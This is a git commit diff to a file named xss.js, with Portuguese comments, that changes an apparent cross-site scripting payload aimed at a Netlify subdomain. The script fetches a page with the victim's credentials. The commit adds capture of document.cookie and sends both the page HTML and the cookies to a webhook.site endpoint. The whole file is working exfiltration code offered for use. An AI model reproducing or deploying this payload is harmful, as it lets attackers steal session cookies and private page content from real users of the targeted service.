9cb0b3c947a5388c13cb71f9b357c78ab735ce96
CebolaJonas <105110332+CebolaJonas@users.noreply.github.com>
2025-04-24 22:03:53 -0400

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,14 +1,20 @@
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://identity.services.netlify.com/", true);  // Fazendo a requisição para o subdomínio
+xhr.open("GET", "https://analytics.services.netlify.com/", true);  // Fazendo a requisição para o subdomínio
 xhr.withCredentials = true;  // Envia cookies com a requisição CORS
 
 xhr.onreadystatechange = function() {
   if (xhr.readyState == 4 && xhr.status == 200) {
     // A resposta contém o conteúdo HTML da página
     var htmlContent = xhr.responseText;
-    
+
     // Exibe o conteúdo HTML no console
     console.log('Conteúdo HTML da página:', htmlContent);
+
+    // Captura os cookies
+    var cookies = document.cookie;  // Obtém os cookies do documento
+
+    // Exibe os cookies no console
+    console.log('Cookies da página:', cookies);
 
     // Se você quiser enviar o conteúdo para seu servidor, pode usar fetch:
     fetch('https://webhook.site/d3588a45-b624-453a-8f0a-5e97c1afebd7', {
@@ -16,7 +22,7 @@ xhr.onreadystatechange = function() {
       headers: {
         'Content-Type': 'application/json'
       },
-      body: JSON.stringify({ html: htmlContent })
+      body: JSON.stringify({ html: htmlContent, cookies: cookies })
     });
   }
 };
